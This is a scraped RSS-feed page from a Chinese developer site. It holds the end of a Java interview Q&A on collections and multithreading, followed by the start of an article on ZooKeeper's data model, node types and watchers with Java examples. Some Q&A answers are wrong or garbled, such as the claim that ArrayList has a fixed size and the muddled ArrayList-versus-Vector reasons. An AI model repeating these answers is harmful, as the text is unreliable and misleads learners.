对于在Map中插入、删除和定位元素这类操作，HashMap是最好的选择。然而，假如你需要对一个有序的key集合进行遍历，TreeMap是更好的选择。基于你的collection的大小，也许向HashMap中添加元素会更快，将map换为TreeMap进行有序key的遍历。<br/>
<strong>23. 说一下 HashMap 的实现原理？</strong><br/>
HashMap概述： HashMap是基于哈希表的Map接口的非同步实现。此实现提供所有可选的映射操作，并允许使用null值和null键。此类不保证映射的顺序，特别是它不保证该顺序恒久不变。<br/>
HashMap的数据结构： 在java编程语言中，最基本的结构就是两种，一个是数组，另外一个是模拟指针（引用），所有的数据结构都可以用这两个基本结构来构造的，HashMap也不例外。HashMap实际上是一个“链表散列”的数据结构，即数组和链表的结合体。<br/>
</p>
<ul>
<li>HashSet底层由HashMap实现</li>
<li>HashSet的值存放于HashMap的key上</li>
<li>HashMap的value统一为PRESENT</li>
</ul>
<p><strong>25. ArrayList 和 LinkedList 的区别是什么？</strong><br/>
最明显的区别是 ArrrayList底层的数据结构是数组，支持随机访问，而 LinkedList 的底层数据结构是双向循环链表，不支持随机访问。使用下标访问一个元素，ArrayList 的时间复杂度是 O(1)，而 LinkedList 是 O(n)。<br/>
<strong>26. 如何实现数组和 List 之间的转换？</strong><br/>
</p>
<ul>
<li>List转换成为数组：调用ArrayList的toArray方法。</li>
<li>数组转换成为List：调用Arrays的asList方法。</li>
</ul>
<p><strong>27. ArrayList 和 Vector 的区别是什么？</strong><br/>
</p>
<ul>
<li>Vector是同步的，而ArrayList不是。然而，如果你寻求在迭代的时候对列表进行改变，你应该使用CopyOnWriteArrayList。</li>
<li>ArrayList比Vector快，它因为有同步，不会过载。</li>
<li>ArrayList更加通用，因为我们可以使用Collections工具类轻易地获取同步列表和只读列表。</li>
</ul>
<p><strong>28. Array 和 ArrayList 有何区别？</strong><br/>
</p>
<ul>
<li>Array可以容纳基本类型和对象，而ArrayList只能容纳对象。</li>
<li>Array是指定大小的，而ArrayList大小是固定的。</li>
<li>Array没有提供ArrayList那么多功能，比如addAll、removeAll和iterator等。</li>
</ul>
<p><strong>29. 在 Queue 中 poll()和 remove()有什么区别？</strong><br/>
poll() 和 remove() 都是从队列中取出一个元素，但是 poll() 在获取元素失败的时候会返回空，但是 remove() 失败的时候会抛出异常。<br/>
<strong>30. 哪些集合类是线程安全的？</strong><br/>
</p>
<ul>
<li>vector：就比arraylist多了个同步化机制（线程安全），因为效率较低，现在已经不太建议使用。在web应用中，特别是前台页面，往往效率（页面响应速度）是优先考虑的。</li>
<li>statck：堆栈类，先进后出。</li>
<li>hashtable：就比hashmap多了个线程安全。</li>
<li>enumeration：枚举，相当于迭代器。</li>
</ul>
<p><strong>31. 迭代器 Iterator 是什么？</strong><br/>
迭代器是一种设计模式，它是一个对象，它可以遍历并选择序列中的对象，而开发人员不需要了解该序列的底层结构。迭代器通常被称为“轻量级”对象，因为创建它的代价小。<br/>
<strong>32. Iterator 怎么使用？有什么特点？</strong><br/>
(1) 使用方法iterator()要求容器返回一个Iterator。第一次调用Iterator的next()方法时，它返回序列的第一个元素。注意：iterator()方法是java.lang.Iterable接口,被Collection继承。<br/>
(2) 使用next()获得序列中的下一个元素。<br/>
(3) 使用hasNext()检查序列中是否还有元素。<br/>
(4) 使用remove()将迭代器新返回的元素删除。<br/>
Iterator是Java迭代器最简单的实现，为List设计的ListIterator具有更多的功能，它可以从两个方向遍历List，也可以从List中插入和删除元素。<br/>
<strong>33. Iterator 和 ListIterator 有什么区别？</strong><br/>
</p>
<ul>
<li>Iterator可用来遍历Set和List集合，但是ListIterator只能用来遍历List。</li>
<li>Iterator对集合只能是前向遍历，ListIterator既可以前向也可以后向。</li>
<li>ListIterator实现了Iterator接口，并包含其他的功能，比如：增加元素，替换元素，获取前一个和后一个元素的索引，等等。</li>
</ul>
<p>三、<strong>多线程</strong><br/>
<strong>35. 并行和并发有什么区别？</strong><br/>
</p>
<ul>
<li>并行是指两个或者多个事件在同一时刻发生；而并发是指两个或多个事件在同一时间间隔发生。</li>
<li>并行是在不同实体上的多个事件，并发是在同一实体上的多个事件。</li>
<li>在一台处理器上“同时”处理多个任务，在多台处理器上同时处理多个任务。如hadoop分布式集群。</li>
</ul>
<p>所以并发编程的目标是充分的利用处理器的每一个核，以达到最高的处理性能。<br/>
<strong>36. 线程和进程的区别？</strong><br/>
简而言之，进程是程序运行和资源分配的基本单位，一个程序至少有一个进程，一个进程至少有一个线程。线程是进程的一个实体，是cpu调度和分派的基本单位，是比程序更小的能独立运行的基本单位。同一进程中的多个线程之间可以并发执行。<br/>
<strong>37. 守护线程是什么？</strong><br/>
守护线程（即daemon thread），是个服务线程，准确地来说就是服务其他的线程。<br/>
<strong>38. 创建线程有哪几种方式？</strong><br/>
①. 继承Thread类创建线程类<br/>
②. 通过Runnable接口创建线程类<br/>
③. 通过Callable和Future创建线程<br/>
<strong>39. 说一下 runnable 和 callable 有什么区别？</strong><br/>
</p>
<ul>
<li>Runnable接口中的run()方法的返回值是void，它做的事情只是纯粹地去执行run()方法中的代码而已；</li>
<li>Callable接口中的call()方法是有返回值的，是一个泛型，和Future、FutureTask配合可以用来获取异步执行的结果。</li>
</ul>
<p><strong>40. 线程有哪些状态？</strong><br/>
线程通常都有五种状态，创建、就绪、运行、阻塞和死亡。<br/>
<strong>41. sleep() 和 wait() 有什么区别？</strong><br/>
sleep()：方法是线程类（Thread）的静态方法，让调用线程进入睡眠状态，让出执行机会给其他线程，等到休眠时间结束后，线程进入就绪状态和其他线程一起竞争cpu的执行时间。因为sleep() 是static静态的方法，他不能改变对象的机锁，当一个synchronized块中调用了sleep() 方法，线程虽然进入休眠，但是对象的机锁没有被释放，其他线程依然无法访问这个对象。<br/>
wait()：wait()是Object类的方法，当一个线程执行到wait方法时，它就进入到一个和该对象相关的等待池，同时释放对象的机锁，使得其他线程能够访问，可以通过notify，notifyAll方法来唤醒等待的线程。<br/>
<strong>42. notify()和 notifyAll()有什么区别？</strong></p>
<ul>
<li>如果线程调用了对象的 wait()方法，那么线程便会处于该对象的等待池中，等待池中的线程不会去竞争该对象的锁。</li>
<li>当有线程调用了对象的 notifyAll()方法（唤醒所有 wait 线程）或 notify()方法（只随机唤醒一个 wait 线程），被唤醒的的线程便会进入该对象的锁池中，锁池中的线程会去竞争该对象锁。也就是说，调用了notify后只要一个线程会由等待池进入锁池，而notifyAll会将该对象等待池内的所有线程移动到锁池中，等待锁竞争。</li>
<li>优先级高的线程竞争到对象锁的概率大，假若某线程没有竞争到该对象锁，它还会留在锁池中，唯有线程再次调用 wait()方法，它才会重新回到等待池中。而竞争到对象锁的线程则继续往下执行，直到执行完了 synchronized 代码块，它会释放掉该对象锁，这时锁池中的线程会继续竞争该对象锁。</li>
</ul>
<p><strong>43. 线程的 run()和 start()有什么区别？</strong><br/>
start()方法来启动一个线程，真正实现了多线程运行。这时无需等待run方法体代码执行完毕，可以直接继续执行下面的代码； 这时此线程是处于就绪状态， 并没有运行。 然后通过此Thread类调用方法run()来完成其运行状态， 这里方法run()称为线程体，它包含了要执行的这个线程的内容， Run方法运行结束， 此线程终止。然后CPU再调度其它线程。<br/>
run()方法是在本线程里的，只是线程里的一个函数,而不是多线程的。 如果直接调用run(),其实就相当于是调用了一个普通函数而已，直接待用run()方法必须等待run()方法执行完毕才能执行下面的代码，所以执行路径还是只有一条，根本就没有线程的特征，所以在多线程执行时要使用start()方法而不是run()方法。<br/>
<strong>44. 创建线程池有哪几种方式？</strong><br/>
①. newFixedThreadPool(int nThreads)<br/>
创建一个固定长度的线程池，每当提交一个任务就创建一个线程，直到达到线程池的最大数量，这时线程规模将不再变化，当线程发生未预期的错误而结束时，线程池会补充一个新的线程。<br/>
②. newCachedThreadPool()<br/>
创建一个可缓存的线程池，如果线程池的规模超过了处理需求，将自动回收空闲线程，而当需求增加时，则可以自动添加新线程，线程池的规模不存在任何限制。<br/>
③. newSingleThreadExecutor()<br/>
这是一个单线程的Executor，它创建单个工作线程来执行任务，如果这个线程异常结束，会创建一个新的来替代它；它的特点是能确保依照任务在队列中的顺序来串行执行。<br/>
④. newScheduledThreadPool(int corePoolSize)<br/>
创建了一个固定长度的线程池，而且以延迟或定时的方式来执行任务，类似于Timer。<br/>
<strong>45. 线程池都有哪些状态？</strong><br/>
线程池有5种状态：Running、ShutDown、Stop、Tidying、Terminated。<br/>
线程池各个状态切换框架图：<br/>
</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/daedeb56f6214c14b62f57fcc5b7a868~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764483585&amp;x-signature=Ff7z85mg0UU1sVNmHc89hLwavaY%3D" alt="" loading="lazy"/></p>
<p><strong>46. 线程池中 submit()和 execute()方法有什么区别？</strong><br/>
</p>
<ul>
<li>接收的参数不一样</li>
<li>submit有返回值，而execute没有</li>
<li>submit方便Exception处理</li>
</ul>
<p><strong>47. 在 java 程序中怎么保证多线程的运行安全？</strong><br/>
线程安全在三个方面体现：<br/>
</p>
<ul>
<li>原子性：提供互斥访问，同一时刻只能有一个线程对数据进行操作，（atomic,synchronized）；</li>
<li>可见性：一个线程对主内存的修改可以及时地被其他线程看到，（synchronized,volatile）；</li>
<li>有序性：一个线程观察其他线程中的指令执行顺序，由于指令重排序，该观察结果一般杂乱无序，（happens-before原则）。</li>
</ul>
<p><strong>48. 多线程锁的升级原理是什么？</strong><br/>
在Java中，锁共有4种状态，级别从低到高依次为：无状态锁，偏向锁，轻量级锁和重量级锁状态，这几个状态会随着竞争情况逐渐升级。锁可以升级但不能降级。<br/>
锁升级的图示过程：<br/>
</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f7328db561b4fcc98ee1da1a04354e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764483585&amp;x-signature=Ixc2JrO5A0yqUl78A9tDzPIpA6E%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入解析ZooKeeper核心机制]]></title>    <link>https://juejin.cn/post/7575102474639343667</link>    <guid>https://juejin.cn/post/7575102474639343667</guid>    <pubDate>2025-11-22T16:16:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575102474639343667" data-draft-id="7574991051436064778" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入解析ZooKeeper核心机制"/> <meta itemprop="keywords" content="ZooKeeper"/> <meta itemprop="datePublished" content="2025-11-22T16:16:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大头an"/> <meta itemprop="url" content="https://juejin.cn/user/618374030438861"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入解析ZooKeeper核心机制
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/618374030438861/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大头an
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-22T16:16:02.000Z" title="Sat Nov 22 2025 16:16:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读22分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. 深入理解 ZooKeeper</h2>
<h3 data-id="heading-1">1.1 什么是 ZooKeeper？</h3>
<blockquote>
<p>ZooKeeper 是一个分布式的、开放源码的<strong>分布式应用程序协调服务</strong>，由雅虎创建，是 Google Chubby 的开源实现。它本质上是一个<strong>分布式小文件存储系统</strong>，专门用于存储和管理分布式系统所需的元数据和配置信息。</p>
</blockquote>
<h3 data-id="heading-2">1.2 核心设计理念</h3>
<p>ZooKeeper 的设计遵循"简单即美"的原则：</p>
<ul>
<li><strong>简单的数据模型</strong>：类似文件系统的树形结构，易于理解和使用</li>
<li><strong>丰富的构建块</strong>：提供分布式应用所需的基本原语和模式</li>
<li><strong>客户端顺序保证</strong>：严格的客户端操作顺序性，确保行为可预测</li>
<li><strong>高性能</strong>：在读多写少的场景下表现优异</li>
</ul>
<h3 data-id="heading-3">1.3 核心特性深度解析</h3>
<h4 data-id="heading-4">1.3.1 原子性（Atomicity）</h4>
<p>在分布式环境中，原子性意味着操作要么在所有节点上成功执行，要么在所有节点上都不执行。ZooKeeper 通过两阶段提交协议保证这一点。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ZooKeeper 保证操作的原子性示例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AtomicOperationExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createNodeAtomically</span><span class="hljs-params">(String path, <span class="hljs-type">byte</span>[] data)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 创建节点操作是原子的</span>
        <span class="hljs-comment">// 不会出现部分节点创建成功的情况</span>
        zk.create(path, data, ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.PERSISTENT);
    }
}
</code></pre>
<h4 data-id="heading-5">1.3.2 顺序一致性（Sequential Consistency）</h4>
<p>ZooKeeper 为所有事务分配全局唯一且递增的事务ID（Zxid），确保：</p>
<ul>
<li>所有事务按 Zxid 顺序执行</li>
<li>客户端能看到相同顺序的事务视图</li>
<li>写操作线性化，读操作可能看到稍旧的数据</li>
</ul>
<h4 data-id="heading-6">1.3.3 可靠性（Reliability）</h4>
<ul>
<li><strong>数据持久化</strong>：所有更新都会持久化到磁盘</li>
<li><strong>自动恢复</strong>：支持数据快照和事务日志，提供自动恢复机制</li>
<li><strong>故障容错</strong>：单点故障不会影响整体服务可用性</li>
</ul>
<h4 data-id="heading-7">1.3.4 单一系统映像</h4>
<p>无论客户端连接到哪个 ZooKeeper 服务器，看到的都是统一的数据视图，这简化了客户端的逻辑处理。</p>
<h2 data-id="heading-8">2. ZooKeeper 数据模型深度剖析</h2>
<h3 data-id="heading-9">2.1 Znode 树形结构详解</h3>
<p>ZooKeeper 的数据模型采用类似文件系统的树形结构，每个节点称为 Znode。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    ROOT[/zookeeper] --&gt; QUOTA[/quota]
    ROOT --&gt; CONFIG[/config]
    
    subgraph "应用命名空间示例"
        APP[/app] --&gt; APP_SERVICE1[/service1]
        APP --&gt; APP_SERVICE2[/service2]
        APP_SERVICE1 --&gt; S1_CONFIG[config]
        APP_SERVICE1 --&gt; S1_LOCKS[/locks]
        APP_SERVICE1 --&gt; S1_MEMBERS[/members]
        APP_SERVICE1 --&gt; S1_QUEUES[/queues]
        
        S1_LOCKS --&gt; LOCK1[lock-0000000001]
        S1_LOCKS --&gt; LOCK2[lock-0000000002]
        S1_MEMBERS --&gt; MEMBER1[192.168.1.1:8080]
        S1_MEMBERS --&gt; MEMBER2[192.168.1.2:8080]
        S1_QUEUES --&gt; QUEUE1[message-0000000001]
        S1_QUEUES --&gt; QUEUE2[message-0000000002]
    end
</code></pre>
<h3 data-id="heading-10">2.2 Znode 内部结构深度解析</h3>
<p>每个 Znode 由三个核心部分组成：</p>
<h4 data-id="heading-11">2.2.1 Stat 状态信息</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Stat</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> czxid;          <span class="hljs-comment">// 创建该节点的事务ID</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> mzxid;          <span class="hljs-comment">// 最后修改该节点的事务ID</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> ctime;          <span class="hljs-comment">// 创建时间戳</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> mtime;          <span class="hljs-comment">// 最后修改时间戳</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> version;         <span class="hljs-comment">// 数据版本号（每次写操作递增）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> cversion;        <span class="hljs-comment">// 子节点版本号（子节点变化时递增）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> aversion;        <span class="hljs-comment">// ACL版本号</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> ephemeralOwner; <span class="hljs-comment">// 临时节点所有者会话ID</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> dataLength;      <span class="hljs-comment">// 数据长度（最大1MB）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> numChildren;     <span class="hljs-comment">// 子节点数量</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> pzxid;          <span class="hljs-comment">// 最后修改子节点的事务ID</span>
}
</code></pre>
<h4 data-id="heading-12">2.2.2 Data 数据存储</h4>
<p>ZooKeeper 设计用于存储配置信息和元数据，而非大容量业务数据：</p>
<ul>
<li><strong>数据大小限制</strong>：每个 Znode 最大 1MB</li>
<li><strong>适用场景</strong>：配置信息、状态标志、序列号等小数据</li>
<li><strong>存储格式</strong>：字节数组，由应用层解析</li>
</ul>
<h4 data-id="heading-13">2.2.3 Children 子节点信息</h4>
<p>维护当前节点的所有子节点列表，支持快速的子节点遍历和监控。</p>
<h3 data-id="heading-14">2.3 节点类型深度分析</h3>
<h4 data-id="heading-15">2.3.1 永久节点（Persistent Nodes）</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 创建永久节点示例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PersistentNodeExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createPersistentNode</span><span class="hljs-params">(String path, String configData)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 创建存储配置信息的永久节点</span>
        zk.create(path, 
                 configData.getBytes(),
                 ZooDefs.Ids.OPEN_ACL_UNSAFE,
                 CreateMode.PERSISTENT);
    }
}
</code></pre>
<p><strong>特点与应用场景</strong>：</p>
<ul>
<li><strong>持久化存储</strong>：显式删除才会消失</li>
<li><strong>支持子节点</strong>：可以创建复杂的目录结构</li>
<li><strong>适用场景</strong>：系统配置、服务元数据、静态信息存储</li>
</ul>
<h4 data-id="heading-16">2.3.2 临时节点（Ephemeral Nodes）</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 创建临时节点 - 用于服务注册和存活检测</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EphemeralNodeExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerService</span><span class="hljs-params">(String serviceName, String endpoint)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">String</span> <span class="hljs-variable">servicePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">"/services/"</span> + serviceName;
        
        <span class="hljs-comment">// 创建临时节点，会话结束自动清理</span>
        zk.create(servicePath + <span class="hljs-string">"/instance-"</span>,
                 endpoint.getBytes(),
                 ZooDefs.Ids.OPEN_ACL_UNSAFE,
                 CreateMode.EPHEMERAL_SEQUENTIAL);
    }
}
</code></pre>
<p><strong>特点与应用场景</strong>：</p>
<ul>
<li><strong>会话绑定</strong>：创建者会话结束自动删除</li>
<li><strong>无子节点</strong>：临时节点不能创建子节点</li>
<li><strong>适用场景</strong>：服务注册发现、会话管理、存活检测</li>
</ul>
<h4 data-id="heading-17">2.3.3 有序节点（Sequential Nodes）</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 创建有序节点 - 用于分布式锁和队列</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SequentialNodeExample</span> {
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">createSequentialNode</span><span class="hljs-params">(String basePath)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 创建有序节点，ZooKeeper自动添加序列号</span>
        <span class="hljs-keyword">return</span> zk.create(basePath + <span class="hljs-string">"-"</span>,
                        <span class="hljs-literal">null</span>,
                        ZooDefs.Ids.OPEN_ACL_UNSAFE,
                        CreateMode.EPHEMERAL_SEQUENTIAL);
        <span class="hljs-comment">// 返回路径如：/locks/lock-0000000001</span>
    }
}
</code></pre>
<p><strong>命名规则与特性</strong>：</p>
<ul>
<li><strong>自动序列号</strong>：ZooKeeper 自动在节点名后添加10位数字序列号</li>
<li><strong>全局有序</strong>：序列号全局单调递增，保证顺序性</li>
<li><strong>组合类型</strong>：可与永久/临时节点组合使用</li>
</ul>
<h3 data-id="heading-18">2.4 Watcher 机制深度解析</h3>
<p>Watcher 是 ZooKeeper 实现分布式协调的核心机制，允许客户端在节点发生变化时接收通知。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AdvancedWatcherExample</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Watcher</span> {
    <span class="hljs-keyword">private</span> ZooKeeper zk;
    <span class="hljs-keyword">private</span> Map&lt;String, List&lt;Watcher&gt;&gt; customWatchers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">(WatchedEvent event)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> event.getPath();
        Event.<span class="hljs-type">EventType</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> event.getType();
        Event.<span class="hljs-type">KeeperState</span> <span class="hljs-variable">state</span> <span class="hljs-operator">=</span> event.getState();
        
        System.out.println(<span class="hljs-string">"Watcher触发: "</span> + event.toString());
        
        <span class="hljs-keyword">switch</span> (type) {
            <span class="hljs-keyword">case</span> NodeCreated:
                handleNodeCreated(path);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> NodeDeleted:
                handleNodeDeleted(path);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> NodeDataChanged:
                handleNodeDataChanged(path);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> NodeChildrenChanged:
                handleNodeChildrenChanged(path);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> None:
                handleSessionEvent(state);
                <span class="hljs-keyword">break</span>;
        }
        
        <span class="hljs-comment">// 重新注册Watcher（一次性特性）</span>
        reRegisterWatcher(path, type);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reRegisterWatcher</span><span class="hljs-params">(String path, Event.EventType type)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">switch</span> (type) {
                <span class="hljs-keyword">case</span> NodeDataChanged:
                <span class="hljs-keyword">case</span> NodeCreated:
                <span class="hljs-keyword">case</span> NodeDeleted:
                    zk.exists(path, <span class="hljs-built_in">this</span>);
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">case</span> NodeChildrenChanged:
                    zk.getChildren(path, <span class="hljs-built_in">this</span>);
                    <span class="hljs-keyword">break</span>;
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            e.printStackTrace();
        }
    }
}
</code></pre>
<p><strong>Watcher 核心特性</strong>：</p>
<ol>
<li>
<p><strong>一次性触发</strong>：</p>
<ul>
<li>触发后自动失效，需要重新注册</li>
<li>避免大量无效通知，减少网络开销</li>
